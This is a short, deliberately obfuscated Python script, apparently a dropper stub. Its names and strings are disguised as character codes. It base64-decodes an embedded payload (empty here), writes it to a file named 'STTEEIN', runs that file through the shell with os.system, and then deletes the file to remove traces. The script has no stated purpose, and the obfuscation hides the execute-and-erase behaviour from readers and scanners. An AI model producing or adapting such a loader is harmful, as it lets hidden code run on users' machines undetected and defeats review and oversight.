
S, T, E, I, N = map(chr, [83, 84, 69, 73, 78])  
ST, TE, EIN = S + T, T + E, E + I + N  
import os as STEIN  
from base64 import b64decode as STEIN_EIN  
ST_TE = ST + TE  
ST_EIN = ST + EIN  
STEIN_STEIN = STEIN_EIN('')  
STEIN_TEIN = lambda STEIN_N: STEIN.system(STEIN_N)  
STEIN_N = lambda STEIN_E: getattr(__import__('builtins'), ''.join(map(chr, [112, 114, 105, 110, 116])))(STEIN_E)  
STEIN_S = lambda STEIN_T: getattr(STEIN.path, ''.join(map(chr, [101, 120, 105, 115, 116, 115])))(STEIN_T)  
STEIN_I = lambda STEIN_TE: getattr(STEIN, ''.join(map(chr, [114, 101, 109, 111, 118, 101])))(STEIN_TE)  

try:
    with open(ST_TE + EIN, ''.join(map(chr, [119, 98]))) as STEIN_FILE:
        STEIN_FILE.write(STEIN_STEIN)
    STEIN_TEIN(''.join(map(chr, [112, 121, 116, 104, 111, 110, 32])) + ST_TE + EIN)
except Exception as STEIN_EX:
    STEIN_N(STEIN_EX)
finally:
    [STEIN_I(STEIN_VAR) for STEIN_VAR in [ST_TE + EIN, ST_EIN] if STEIN_S(STEIN_VAR)]
